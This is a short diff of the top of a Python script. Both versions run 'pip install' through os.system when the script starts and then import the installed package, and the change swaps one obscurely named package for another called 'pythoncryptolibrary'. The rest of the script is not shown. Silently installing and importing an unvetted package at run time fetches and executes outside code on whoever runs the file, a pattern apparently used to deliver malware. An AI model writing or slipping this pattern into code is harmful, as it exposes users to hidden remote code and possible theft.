@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolorpkgV1")
-import pipcolorpkgV1
+os.system("pip install pythoncryptolibrary")
+import pythoncryptolibrary
 import random
 import requests
 import time
